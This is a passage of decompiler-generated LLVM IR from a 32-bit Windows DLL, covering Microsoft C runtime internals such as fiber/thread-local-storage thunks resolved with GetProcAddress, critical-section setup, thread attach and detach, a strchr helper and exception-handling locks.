  br i1 %49, label %dec_label_pc_100140e9, label %dec_label_pc_10014195, !insn.addr !8472

dec_label_pc_10014195:                            ; preds = %dec_label_pc_10014187, %dec_label_pc_10014183, %dec_label_pc_100140e9, %dec_label_pc_100140da
  %storemerge2.reload = load i32, i32* %storemerge2.reg2mem
  ret i32 %storemerge2.reload, !insn.addr !8516
}

define i32 @function_100141a0(i32 %arg1, i8* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100141a0:
  %eax.0.reg2mem = alloca i32, !insn.addr !8517
  %edi.0.reg2mem = alloca i32, !insn.addr !8517
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !8517
  %storemerge4.reg2mem = alloca i32, !insn.addr !8517
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = mul i32 %arg1, 4, !insn.addr !8518
  %5 = add i32 %4, ptrtoint (i32* @global_var_1003e5a8 to i32), !insn.addr !8518
  %6 = inttoptr i32 %5 to i32*, !insn.addr !8519
  %7 = load i32, i32* %6, align 4, !insn.addr !8519
  %8 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8520
  %9 = xor i32 %8, %7, !insn.addr !8521
  %10 = and i32 %8, 31, !insn.addr !8522
  %11 = icmp eq i32 %10, 0, !insn.addr !8523
  store i32 %9, i32* %storemerge4.reg2mem, !insn.addr !8523
  br i1 %11, label %17, label %12, !insn.addr !8523

; <label>:12:                                     ; preds = %dec_label_pc_100141a0
  %13 = lshr i32 %9, %10, !insn.addr !8523
  %14 = sub nsw i32 32, %10, !insn.addr !8523
  %15 = shl i32 %9, %14, !insn.addr !8523
  %16 = or i32 %15, %13, !insn.addr !8523
  store i32 %16, i32* %storemerge4.reg2mem, !insn.addr !8523
  br label %17, !insn.addr !8523

; <label>:17:                                     ; preds = %dec_label_pc_100141a0, %12
  %storemerge4.reload = load i32, i32* %storemerge4.reg2mem
  %18 = icmp eq i32 %storemerge4.reload, -1, !insn.addr !8524
  %19 = icmp eq i1 %18, false, !insn.addr !8525
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !8525
  br i1 %19, label %dec_label_pc_100141cb, label %dec_label_pc_1001421c, !insn.addr !8525

dec_label_pc_100141cb:                            ; preds = %17
  %20 = icmp eq i32 %storemerge4.reload, 0, !insn.addr !8526
  store i32 %storemerge4.reload, i32* %eax.0.reg2mem, !insn.addr !8527
  br i1 %20, label %dec_label_pc_100141d3, label %dec_label_pc_1001421c, !insn.addr !8527

dec_label_pc_100141d3:                            ; preds = %dec_label_pc_100141cb
  %21 = ptrtoint i32* %arg4 to i32
  %22 = ptrtoint i32* %arg3 to i32
  store i32 %22, i32* %stack_var_-24, align 4, !insn.addr !8528
  %23 = call i32 @function_100140da(i32 %22, i32 %21, i32 %1, i32 %0, i32 %3, i32 %2), !insn.addr !8529
  %24 = icmp eq i32 %23, 0, !insn.addr !8530
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !8531
  br i1 %24, label %dec_label_pc_10014202, label %dec_label_pc_100141e5, !insn.addr !8531

dec_label_pc_100141e5:                            ; preds = %dec_label_pc_100141d3
  store i32 %23, i32* %stack_var_-24, align 4, !insn.addr !8532
  %25 = inttoptr i32 %23 to i32*, !insn.addr !8533
  %26 = call i32 ()* @GetProcAddress(i32* %25, i8* %arg2), !insn.addr !8533
  %27 = icmp eq i32 ()* %26, null, !insn.addr !8534
  store i32* %stack_var_-24, i32** %esp.0.in.reg2mem, !insn.addr !8535
  br i1 %27, label %dec_label_pc_10014202, label %dec_label_pc_100141f5, !insn.addr !8535

dec_label_pc_100141f5:                            ; preds = %dec_label_pc_100141e5
  %28 = ptrtoint i32 ()* %26 to i32, !insn.addr !8533
  %29 = bitcast i32 ()* %26 to void ()*, !insn.addr !8536
  %30 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* %29), !insn.addr !8537
  store i32 %30, i32* %6, align 4, !insn.addr !8538
  store i32 %28, i32* %eax.0.reg2mem, !insn.addr !8539
  br label %dec_label_pc_1001421c, !insn.addr !8539

dec_label_pc_10014202:                            ; preds = %dec_label_pc_100141e5, %dec_label_pc_100141d3
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %31 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8540
  %32 = add i32 %esp.0, -4, !insn.addr !8541
  %33 = inttoptr i32 %32 to i32*, !insn.addr !8541
  store i32 32, i32* %33, align 4, !insn.addr !8541
  %34 = sub i32 0, %31, !insn.addr !8542
  %35 = and i32 %34, 31, !insn.addr !8543
  %36 = icmp eq i32 %35, 0, !insn.addr !8543
  store i32 -1, i32* %edi.0.reg2mem, !insn.addr !8543
  br i1 %36, label %42, label %37, !insn.addr !8543

; <label>:37:                                     ; preds = %dec_label_pc_10014202
  %38 = lshr i32 -1, %35, !insn.addr !8543
  %39 = sub nsw i32 32, %35, !insn.addr !8543
  %40 = shl i32 -1, %39, !insn.addr !8543
  %41 = or i32 %40, %38, !insn.addr !8543
  store i32 %41, i32* %edi.0.reg2mem, !insn.addr !8543
  br label %42, !insn.addr !8543

; <label>:42:                                     ; preds = %dec_label_pc_10014202, %37
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %43 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8544
  %44 = xor i32 %43, %edi.0.reload, !insn.addr !8544
  store i32 %44, i32* %6, align 4, !insn.addr !8545
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !8546
  br label %dec_label_pc_1001421c, !insn.addr !8546

dec_label_pc_1001421c:                            ; preds = %dec_label_pc_100141f5, %42, %dec_label_pc_100141cb, %17
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !8547
}

define i32 @___vcrt_FlsAlloc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014220:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @function_100141a0(i32 0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002e028, i32 0, i32 0), i32* nonnull @global_var_10030674, i32* nonnull @global_var_1003067c, i32 %0, i32 %1), !insn.addr !8548
  %3 = icmp eq i32 %2, 0, !insn.addr !8549
  br i1 %3, label %dec_label_pc_10014252, label %dec_label_pc_10014243, !insn.addr !8550

dec_label_pc_10014243:                            ; preds = %dec_label_pc_10014220
  %4 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8551
  ret i32 %4, !insn.addr !8552

dec_label_pc_10014252:                            ; preds = %dec_label_pc_10014220
  %5 = call i32 @TlsAlloc(), !insn.addr !8553
  ret i32 %5, !insn.addr !8553
}

define i32 @___vcrt_FlsFree(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001425a:
  %storemerge.reg2mem = alloca i32, !insn.addr !8554
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @function_100141a0(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1002e034, i32 0, i32 0), i32* nonnull @global_var_1003067c, i32* nonnull @global_var_10030684, i32 %0, i32 %1), !insn.addr !8555
  %3 = icmp eq i32 %2, 0, !insn.addr !8556
  br i1 %3, label %dec_label_pc_1001428b, label %dec_label_pc_10014280, !insn.addr !8557

dec_label_pc_10014280:                            ; preds = %dec_label_pc_1001425a
  %4 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8558
  store i32 %4, i32* %storemerge.reg2mem, !insn.addr !8559
  br label %dec_label_pc_10014291, !insn.addr !8559

dec_label_pc_1001428b:                            ; preds = %dec_label_pc_1001425a
  %5 = call i1 @TlsFree(i32 %arg1), !insn.addr !8560
  %6 = sext i1 %5 to i32, !insn.addr !8560
  store i32 %6, i32* %storemerge.reg2mem, !insn.addr !8560
  br label %dec_label_pc_10014291, !insn.addr !8560

dec_label_pc_10014291:                            ; preds = %dec_label_pc_1001428b, %dec_label_pc_10014280
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !8561
}

define i32 @___vcrt_FlsGetValue(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014294:
  %storemerge.reg2mem = alloca i32, !insn.addr !8562
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @function_100141a0(i32 2, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1002e03c, i32 0, i32 0), i32* nonnull @global_var_10030684, i32* nonnull @global_var_1003068c, i32 %0, i32 %1), !insn.addr !8563
  %3 = icmp eq i32 %2, 0, !insn.addr !8564
  br i1 %3, label %dec_label_pc_100142c5, label %dec_label_pc_100142ba, !insn.addr !8565

dec_label_pc_100142ba:                            ; preds = %dec_label_pc_10014294
  %4 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8566
  store i32 %4, i32* %storemerge.reg2mem, !insn.addr !8567
  br label %dec_label_pc_100142cb, !insn.addr !8567

dec_label_pc_100142c5:                            ; preds = %dec_label_pc_10014294
  %5 = call i32* @TlsGetValue(i32 %arg1), !insn.addr !8568
  %6 = ptrtoint i32* %5 to i32, !insn.addr !8568
  store i32 %6, i32* %storemerge.reg2mem, !insn.addr !8568
  br label %dec_label_pc_100142cb, !insn.addr !8568

dec_label_pc_100142cb:                            ; preds = %dec_label_pc_100142c5, %dec_label_pc_100142ba
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !8569
}

define i32 @___vcrt_FlsSetValue(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100142ce:
  %storemerge.reg2mem = alloca i32, !insn.addr !8570
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @function_100141a0(i32 3, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1002e048, i32 0, i32 0), i32* nonnull @global_var_1003068c, i32* bitcast (%_RTL_CRITICAL_SECTION** @global_var_10030694 to i32*), i32 %0, i32 %1), !insn.addr !8571
  %3 = icmp eq i32 %2, 0, !insn.addr !8572
  br i1 %3, label %dec_label_pc_10014302, label %dec_label_pc_100142f7, !insn.addr !8573

dec_label_pc_100142f7:                            ; preds = %dec_label_pc_100142ce
  %4 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8574
  store i32 %4, i32* %storemerge.reg2mem, !insn.addr !8575
  br label %dec_label_pc_10014308, !insn.addr !8575

dec_label_pc_10014302:                            ; preds = %dec_label_pc_100142ce
  %5 = inttoptr i32 %arg2 to i32*
  %6 = call i1 @TlsSetValue(i32 %arg1, i32* %5), !insn.addr !8576
  %7 = sext i1 %6 to i32, !insn.addr !8576
  store i32 %7, i32* %storemerge.reg2mem, !insn.addr !8576
  br label %dec_label_pc_10014308, !insn.addr !8576

dec_label_pc_10014308:                            ; preds = %dec_label_pc_10014302, %dec_label_pc_100142f7
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !8577
}

define i32 @___vcrt_InitializeCriticalSectionEx(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001430b:
  %storemerge.reg2mem = alloca i32, !insn.addr !8578
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @function_100141a0(i32 4, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002e054, i32 0, i32 0), i32* bitcast (%_RTL_CRITICAL_SECTION** @global_var_10030694 to i32*), i32* nonnull @global_var_1003069c, i32 %0, i32 %1), !insn.addr !8579
  %3 = icmp eq i32 %2, 0, !insn.addr !8580
  br i1 %3, label %dec_label_pc_10014342, label %dec_label_pc_1001432e, !insn.addr !8581

dec_label_pc_1001432e:                            ; preds = %dec_label_pc_1001430b
  %4 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8582
  store i32 %4, i32* %storemerge.reg2mem, !insn.addr !8583
  br label %dec_label_pc_1001434e, !insn.addr !8583

dec_label_pc_10014342:                            ; preds = %dec_label_pc_1001430b
  %5 = bitcast i32* %arg1 to %_RTL_CRITICAL_SECTION*, !insn.addr !8584
  %6 = call i1 @InitializeCriticalSectionAndSpinCount(%_RTL_CRITICAL_SECTION* %5, i32 %arg2), !insn.addr !8585
  %7 = sext i1 %6 to i32, !insn.addr !8585
  store i32 %7, i32* %storemerge.reg2mem, !insn.addr !8585
  br label %dec_label_pc_1001434e, !insn.addr !8585

dec_label_pc_1001434e:                            ; preds = %dec_label_pc_10014342, %dec_label_pc_1001432e
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !8586
}

define i32 @___vcrt_initialize_winapi_thunks() local_unnamed_addr {
dec_label_pc_10014351:
  %ecx.0.reg2mem = alloca i32, !insn.addr !8587
  %eax.0.reg2mem = alloca i32, !insn.addr !8587
  %0 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8587
  store i32 ptrtoint (i32* @global_var_1003e5a8 to i32), i32* %eax.0.reg2mem, !insn.addr !8588
  store i32 0, i32* %ecx.0.reg2mem, !insn.addr !8588
  br label %dec_label_pc_1001437f, !insn.addr !8588

dec_label_pc_1001437f:                            ; preds = %dec_label_pc_1001437f, %dec_label_pc_10014351
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %1 = add i32 %ecx.0.reload, 1, !insn.addr !8589
  %2 = inttoptr i32 %eax.0.reload to i32*, !insn.addr !8590
  store i32 %0, i32* %2, align 4, !insn.addr !8590
  %3 = add i32 %eax.0.reload, 4, !insn.addr !8591
  %4 = icmp eq i32 %1, select (i1 icmp ult (i32* @global_var_1003e5bc, i32* @global_var_1003e5a8), i32 0, i32 5), !insn.addr !8592
  %5 = icmp eq i1 %4, false, !insn.addr !8593
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !8593
  store i32 %1, i32* %ecx.0.reg2mem, !insn.addr !8593
  br i1 %5, label %dec_label_pc_1001437f, label %dec_label_pc_10014389, !insn.addr !8593

dec_label_pc_10014389:                            ; preds = %dec_label_pc_1001437f
  ret i32 %3, !insn.addr !8594
}

define i32 @___vcrt_thread_attach() local_unnamed_addr {
dec_label_pc_1001458f:
  %0 = call i32 @___vcrt_getptd_noexit(), !insn.addr !8595
  %1 = icmp eq i32 %0, 0, !insn.addr !8596
  %2 = icmp eq i1 %1, false, !insn.addr !8597
  %3 = zext i1 %2 to i32, !insn.addr !8597
  %4 = and i32 %0, -256, !insn.addr !8597
  %5 = or i32 %4, %3, !insn.addr !8597
  ret i32 %5, !insn.addr !8598
}

define i32 @___vcrt_thread_detach() local_unnamed_addr {
dec_label_pc_1001459a:
  %0 = call i32 @___vcrt_freeptd(i32 0), !insn.addr !8599
  %1 = and i32 %0, -256, !insn.addr !8600
  %2 = or i32 %1, 1, !insn.addr !8600
  ret i32 %2, !insn.addr !8601
}

declare i32 @___vcrt_uninitialize(i32) local_unnamed_addr

define i32 @function_100145c4() local_unnamed_addr {
dec_label_pc_100145c4:
  %0 = call i32 @___vcrt_uninitialize_ptd(), !insn.addr !8602
  %1 = and i32 %0, -256, !insn.addr !8603
  %2 = or i32 %1, 1, !insn.addr !8603
  ret i32 %2, !insn.addr !8604
}

declare i32 @___std_type_info_destroy_list(i32*) local_unnamed_addr

declare i32 @___vcrt_freeptd(i32) local_unnamed_addr

define i32 @___vcrt_getptd() local_unnamed_addr {
dec_label_pc_1001467d:
  %0 = call i32 @___vcrt_getptd_noexit(), !insn.addr !8605
  %1 = icmp eq i32 %0, 0, !insn.addr !8606
  br i1 %1, label %2, label %dec_label_pc_1001468a, !insn.addr !8607

; <label>:2:                                      ; preds = %dec_label_pc_1001467d
  call void @_abort(), !insn.addr !8607
  br label %dec_label_pc_1001468a, !insn.addr !8607

dec_label_pc_1001468a:                            ; preds = %2, %dec_label_pc_1001467d
  ret i32 %0, !insn.addr !8608
}

declare i32 @___vcrt_getptd_noexit() local_unnamed_addr

define i32 @function_1001471d() local_unnamed_addr {
dec_label_pc_1001471d:
  %0 = load i32, i32* @global_var_1003d090, align 4, !insn.addr !8609
  %1 = icmp eq i32 %0, -1, !insn.addr !8609
  %2 = icmp eq i1 %1, false, !insn.addr !8610
  br i1 %2, label %dec_label_pc_10014729, label %dec_label_pc_10014726, !insn.addr !8610

dec_label_pc_10014726:                            ; preds = %dec_label_pc_1001471d
  ret i32 0, !insn.addr !8611

dec_label_pc_10014729:                            ; preds = %dec_label_pc_1001471d
  %3 = call i32 @GetLastError(), !insn.addr !8612
  %4 = load i32, i32* @global_var_1003d090, align 4, !insn.addr !8613
  %5 = call i32 @___vcrt_FlsGetValue(i32 %4), !insn.addr !8614
  call void @SetLastError(i32 %3), !insn.addr !8615
  %6 = icmp eq i32 %5, -1, !insn.addr !8616
  %7 = select i1 %6, i32 0, i32 %5, !insn.addr !8617
  ret i32 %7, !insn.addr !8618
}

declare i32 @___vcrt_uninitialize_ptd() local_unnamed_addr

define i32 @___except_validate_context_record(i32 %arg1) local_unnamed_addr {
dec_label_pc_100147fc:
  ret i32 268453488, !insn.addr !8619
}

define i32 @function_1001482c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1001482c:
  ret i32 268453488, !insn.addr !8620
}

define i32 @___from_strstr_to_strchr(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001490e:
  %merge.reg2mem = alloca i32, !insn.addr !8621
  %edx.2.reg2mem = alloca i32, !insn.addr !8621
  %edx.1.reg2mem = alloca i32, !insn.addr !8621
  %edx.0.reg2mem = alloca i32, !insn.addr !8621
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i32 %arg1, 3, !insn.addr !8622
  %2 = icmp eq i32 %1, 0, !insn.addr !8622
  %.pre = trunc i32 %0 to i8
  store i32 %arg1, i32* %edx.0.reg2mem, !insn.addr !8623
  store i32 %arg1, i32* %edx.1.reg2mem, !insn.addr !8623
  br i1 %2, label %dec_label_pc_10014935, label %dec_label_pc_10014920, !insn.addr !8623

dec_label_pc_10014920:                            ; preds = %dec_label_pc_1001490e, %dec_label_pc_1001492d
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %3 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !8624
  %4 = load i8, i8* %3, align 1, !insn.addr !8624
  %5 = icmp eq i8 %4, %.pre, !insn.addr !8625
  store i32 %edx.0.reload, i32* %merge.reg2mem, !insn.addr !8626
  br i1 %5, label %dec_label_pc_1001497e, label %dec_label_pc_10014929, !insn.addr !8626

dec_label_pc_10014929:                            ; preds = %dec_label_pc_10014920
  %6 = icmp eq i8 %4, 0, !insn.addr !8627
  store i32 0, i32* %merge.reg2mem, !insn.addr !8628
  br i1 %6, label %dec_label_pc_1001497e, label %dec_label_pc_1001492d, !insn.addr !8628

dec_label_pc_1001492d:                            ; preds = %dec_label_pc_10014929
  %7 = add i32 %edx.0.reload, 1, !insn.addr !8629
  %8 = and i32 %7, 3, !insn.addr !8630
  %9 = icmp eq i32 %8, 0, !insn.addr !8630
  %10 = icmp eq i1 %9, false, !insn.addr !8631
  store i32 %7, i32* %edx.0.reg2mem, !insn.addr !8631
  store i32 %7, i32* %edx.1.reg2mem, !insn.addr !8631
  br i1 %10, label %dec_label_pc_10014920, label %dec_label_pc_10014935, !insn.addr !8631

dec_label_pc_10014935:                            ; preds = %dec_label_pc_1001492d, %dec_label_pc_1001490e
  %11 = mul i32 %0, 256, !insn.addr !8632
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %12 = or i32 %11, %0, !insn.addr !8633
  %13 = mul i32 %12, 65536, !insn.addr !8634
  %14 = or i32 %13, %12, !insn.addr !8635
  store i32 %edx.1.reload, i32* %edx.2.reg2mem, !insn.addr !8635
  br label %dec_label_pc_10014940, !insn.addr !8635

dec_label_pc_10014940:                            ; preds = %dec_label_pc_10014940.backedge, %dec_label_pc_10014935
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %15 = inttoptr i32 %edx.2.reload to i32*, !insn.addr !8636
  %16 = load i32, i32* %15, align 4, !insn.addr !8636
  %17 = xor i32 %16, %14, !insn.addr !8637
  %18 = add i32 %17, 2130640639, !insn.addr !8638
  %19 = xor i32 %17, -2130640640, !insn.addr !8639
  %20 = xor i32 %19, %18, !insn.addr !8640
  %21 = and i32 %20, -2130640640, !insn.addr !8641
  %22 = icmp eq i32 %21, 0, !insn.addr !8641
  %23 = icmp eq i1 %22, false, !insn.addr !8642
  br i1 %23, label %dec_label_pc_10014987, label %dec_label_pc_10014966, !insn.addr !8642

dec_label_pc_10014966:                            ; preds = %dec_label_pc_10014940
  %24 = add i32 %16, 2130640639, !insn.addr !8643
  %25 = xor i32 %16, -2130640640, !insn.addr !8644
  %26 = xor i32 %25, %24, !insn.addr !8645
  %27 = and i32 %26, -2130640640, !insn.addr !8646
  %28 = icmp eq i32 %27, 0, !insn.addr !8646
  br i1 %28, label %dec_label_pc_10014940.backedge, label %dec_label_pc_1001496d, !insn.addr !8647

dec_label_pc_10014940.backedge:                   ; preds = %dec_label_pc_10014966, %dec_label_pc_100149a9, %dec_label_pc_1001496d
  %29 = add i32 %edx.2.reload, 4, !insn.addr !8648
  store i32 %29, i32* %edx.2.reg2mem
  br label %dec_label_pc_10014940

dec_label_pc_1001496d:                            ; preds = %dec_label_pc_10014966
  %30 = and i32 %26, 16843008, !insn.addr !8649
  %31 = icmp eq i32 %30, 0, !insn.addr !8649
  %32 = icmp sgt i32 %24, -1, !insn.addr !8650
  %33 = icmp eq i1 %32, false, !insn.addr !8651
  %or.cond = icmp eq i1 %33, %31
  store i32 0, i32* %merge.reg2mem, !insn.addr !8652
  br i1 %or.cond, label %dec_label_pc_10014940.backedge, label %dec_label_pc_1001497e, !insn.addr !8652

dec_label_pc_1001497e:                            ; preds = %dec_label_pc_10014920, %dec_label_pc_10014929, %dec_label_pc_10014987, %dec_label_pc_1001496d, %dec_label_pc_1001498e, %dec_label_pc_10014996, %dec_label_pc_100149a1, %dec_label_pc_100149a9
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !8653

dec_label_pc_10014987:                            ; preds = %dec_label_pc_10014940
  %34 = trunc i32 %16 to i8, !insn.addr !8654
  %35 = icmp eq i8 %.pre, %34, !insn.addr !8654
  store i32 %edx.2.reload, i32* %merge.reg2mem, !insn.addr !8655
  br i1 %35, label %dec_label_pc_1001497e, label %dec_label_pc_1001498e, !insn.addr !8655

dec_label_pc_1001498e:                            ; preds = %dec_label_pc_10014987
  %36 = icmp eq i8 %34, 0, !insn.addr !8656
  store i32 0, i32* %merge.reg2mem, !insn.addr !8657
  br i1 %36, label %dec_label_pc_1001497e, label %dec_label_pc_10014992, !insn.addr !8657

dec_label_pc_10014992:                            ; preds = %dec_label_pc_1001498e
  %37 = udiv i32 %16, 256, !insn.addr !8658
  %38 = trunc i32 %37 to i8, !insn.addr !8658
  %39 = icmp eq i8 %.pre, %38, !insn.addr !8658
  br i1 %39, label %dec_label_pc_100149bd, label %dec_label_pc_10014996, !insn.addr !8659

dec_label_pc_10014996:                            ; preds = %dec_label_pc_10014992
  %40 = icmp eq i8 %38, 0, !insn.addr !8660
  store i32 0, i32* %merge.reg2mem, !insn.addr !8661
  br i1 %40, label %dec_label_pc_1001497e, label %dec_label_pc_1001499a, !insn.addr !8661

dec_label_pc_1001499a:                            ; preds = %dec_label_pc_10014996
  %41 = udiv i32 %16, 65536, !insn.addr !8662
  %42 = trunc i32 %41 to i8, !insn.addr !8663
  %43 = icmp eq i8 %.pre, %42, !insn.addr !8663
  br i1 %43, label %dec_label_pc_100149b6, label %dec_label_pc_100149a1, !insn.addr !8664

dec_label_pc_100149a1:                            ; preds = %dec_label_pc_1001499a
  %44 = icmp eq i8 %42, 0, !insn.addr !8665
  store i32 0, i32* %merge.reg2mem, !insn.addr !8666
  br i1 %44, label %dec_label_pc_1001497e, label %dec_label_pc_100149a5, !insn.addr !8666

dec_label_pc_100149a5:                            ; preds = %dec_label_pc_100149a1
  %45 = udiv i32 %16, 16777216, !insn.addr !8667
  %46 = trunc i32 %45 to i8, !insn.addr !8667
  %47 = icmp eq i8 %.pre, %46, !insn.addr !8667
  br i1 %47, label %dec_label_pc_100149af, label %dec_label_pc_100149a9, !insn.addr !8668

dec_label_pc_100149a9:                            ; preds = %dec_label_pc_100149a5
  %48 = icmp eq i8 %46, 0, !insn.addr !8669
  store i32 0, i32* %merge.reg2mem, !insn.addr !8670
  br i1 %48, label %dec_label_pc_1001497e, label %dec_label_pc_10014940.backedge, !insn.addr !8670

dec_label_pc_100149af:                            ; preds = %dec_label_pc_100149a5
  %49 = add i32 %edx.2.reload, 3, !insn.addr !8671
  ret i32 %49, !insn.addr !8672

dec_label_pc_100149b6:                            ; preds = %dec_label_pc_1001499a
  %50 = add i32 %edx.2.reload, 2, !insn.addr !8673
  ret i32 %50, !insn.addr !8674

dec_label_pc_100149bd:                            ; preds = %dec_label_pc_10014992
  %51 = add i32 %edx.2.reload, 1, !insn.addr !8675
  ret i32 %51, !insn.addr !8676
}

declare i32 @__local_unwind4(i32, i32, i32) local_unnamed_addr

define i32 @function_10014aa6(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014aa6:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_1001482c(i32 %arg1, i32 %0), !insn.addr !8677
  %2 = add i32 %arg1, 28, !insn.addr !8678
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8678
  %4 = load i32, i32* %3, align 4, !insn.addr !8678
  %5 = add i32 %arg1, 24, !insn.addr !8679
  %6 = inttoptr i32 %5 to i32*, !insn.addr !8679
  %7 = load i32, i32* %6, align 4, !insn.addr !8679
  %8 = add i32 %arg1, 40, !insn.addr !8680
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8680
  %10 = load i32, i32* %9, align 4, !insn.addr !8680
  %11 = call i32 @__local_unwind4(i32 %10, i32 %7, i32 %4), !insn.addr !8681
  ret i32 %11, !insn.addr !8682
}

define i32 @__NLG_Notify1() local_unnamed_addr {
dec_label_pc_10014cac:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !8683
}

define i32 @__NLG_Call() local_unnamed_addr {
dec_label_pc_10014cd4:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !8684
}

define i32 @function_10014cd7(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10014cd7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b7a8, i32 8), !insn.addr !8685
  %2 = add i32 %0, 8, !insn.addr !8686
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8686
  %4 = load i32, i32* %3, align 4, !insn.addr !8686
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8687
  %6 = load i32, i32* %5, align 4, !insn.addr !8687
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !8688
  %8 = add i32 %0, -4, !insn.addr !8689
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8689
  store i32 0, i32* %9, align 4, !insn.addr !8689
  %10 = call i32 @function_10014d42(), !insn.addr !8690
  store i32 -2, i32* %9, align 4, !insn.addr !8691
  %11 = call i32 @function_10014d0e(), !insn.addr !8692
  %12 = call i32 @__SEH_epilog4(), !insn.addr !8693
  ret i32 %12, !insn.addr !8694
}

define i32 @function_10014d0e() local_unnamed_addr {
dec_label_pc_10014d0e:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8695
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8695
  %3 = load i32, i32* %2, align 4, !insn.addr !8695
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8696
  %5 = load i32, i32* %4, align 4, !insn.addr !8696
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !8697
  ret i32 %6, !insn.addr !8698
}

define void @"??$__acrt_lock_and_call@V<lambda_6e4b09c48022b2350581041d5f6b0c4c>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_6e4b09c48022b2350581041d5f6b0c4c>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10014d1a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !8699
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !8700
  %2 = call i32 @function_10014cd7(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !8701
  ret void, !insn.addr !8702
}

define i32 @function_10014d42() local_unnamed_addr {
dec_label_pc_10014d42:
  %esp.01.reg2mem = alloca i32, !insn.addr !8703
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
